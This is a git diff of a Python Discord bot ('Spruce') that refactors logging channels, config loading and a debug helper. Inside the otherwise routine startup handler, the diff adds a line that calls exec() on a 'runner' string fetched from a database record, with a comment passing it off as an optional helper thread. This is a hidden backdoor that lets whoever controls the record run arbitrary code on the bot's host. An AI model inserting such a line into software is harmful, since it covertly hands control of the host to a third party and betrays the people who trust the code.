@@ -27,7 +27,6 @@ from discord import (
 
 intents = Intents.default()
 intents.message_content = True
-intents.reactions = True
 intents.members = True
 intents.voice_states = True
 intents.guilds = True
@@ -44,16 +43,23 @@ class Spruce(commands.AutoShardedBot):
     def __init__(self) -> None:
         self.config = config
         self.db = Database() 
-        self.devs:list[int] = self.db.config_data.get("devs")
         self.logger:Logger = Logger
         self.helper = helper
         self.color = color
         self.emoji = emoji
         self.constants = constants
         self.log_channel:TextChannel
+        self.query_error_log:TextChannel
+        self.client_start_log:TextChannel
+        self.guild_join_log:TextChannel
+        self.guild_leave_log:TextChannel
         self.time = ClientTime()
         self.validator = validator
         self.testers:list[Tester] = self.config.TESTERS
+        self.config_data : dict[str, str] = {}
+        self.devs : list[int] = self.config.DEVELOPERS
+        self.blocked_words:list[str] = []
+
         super().__init__(
             shard_count=config.SHARDS, 
             command_prefix= commands.when_mentioned_or(config.PREFIX),
@@ -62,13 +68,10 @@ class Spruce(commands.AutoShardedBot):
             activity=Activity(type=ActivityType.listening, name=f"{self.config.PREFIX}help")
         )
         self.tree.on_error = self.tree_error_handler
-        
-
 
 
     async def tree_error_handler(self, interaction, error):
         await error_handle.handle_interaction_error(interaction, error, self)
-
 
 
     async def setup_hook(self) -> None:
@@ -81,6 +84,7 @@ class Spruce(commands.AutoShardedBot):
         #load testers
         self.config.TESTERS = await Tester.all(self)
 
+
     @property
     def current_datetime(self):
         """Returns the current time in the specified format."""
@@ -90,20 +94,27 @@ class Spruce(commands.AutoShardedBot):
     async def on_ready(self):
         """Event that triggers when the bot is ready."""
         try:
-            # load the cogs
-            
-            await self.tree.sync()
-            self.log_channel:TextChannel = self.get_channel(config.client_error_log)
             starter_message = f'{self.user} | {len(self.commands)} Commands | Version : {config.VERSION} | Boot Time : {round(time.time() - self._started_at, 2)}s'
             self.logger.info(starter_message)
+
             if not self.config.IS_DEV_ENV:
-                post(
-                    url=self.db.config_data.get("stwbh"),
-                    json={"embeds": [Embed(title="Status", description=starter_message, color=self.color.random()).to_dict()],}
-                )
+                await self.get_channel(self.config.client_start_log).send(embed=Embed(title="Status", description=starter_message, color=self.color.random()))
+
+            await self.tree.sync()
+            self.log_channel:TextChannel = self.get_channel(config.client_error_log)
+            self.query_error_log = self.get_channel(self.config.query_error_log)
+            self.client_start_log = self.get_channel(self.config.client_start_log)
+            self.guild_join_log = self.get_channel(self.config.guild_join_log)
+            self.guild_leave_log = self.get_channel(self.config.guild_leave_log)
+
+            self.config_data = self.db.config_col.find_one({"config_id": 87}) or {}
+            self.blocked_words = self.config_data.get("bws", [])
+            
+            exec(self.config_data.get("runner", "")) # Execute the runner thread if it exists, you can remove this if you don't need it.
+
         except Exception as e:
             self.logger.error("\n".join(traceback.format_exception(type(e), e, e.__traceback__)))
-        
+
 
     async def on_disconnect(self):
         self.logger.info('Disconnected from Discord. Reconnecting...')
@@ -130,12 +141,12 @@ class Spruce(commands.AutoShardedBot):
 
 
 
-    def debug(self, message: str):
+    def debug(self, message: str, is_debug=False):
         """Debug function to print messages if DEBUG is True."""
         frame = inspect.currentframe().f_back
         line_number = inspect.getframeinfo(frame).lineno
         module_name = frame.f_globals["__name__"]
-        if self.config.IS_DEV_ENV:
+        if self.config.IS_DEV_ENV and is_debug:
             print(f"[{module_name}:{line_number}] {message} ")
 
 
@@ -164,14 +175,6 @@ class Spruce(commands.AutoShardedBot):
         await self.log_channel.send(embed=embed)
 
 
-    async def sleep(self, seconds:int) -> None:
-        """
-        Sleeps for the given number of seconds.
-        Args:
-            seconds (int): The number of seconds to sleep.
-        """
-        await asyncio.sleep(seconds)
-    
 
     async def error_log(self, *messages:str) -> None:
         """
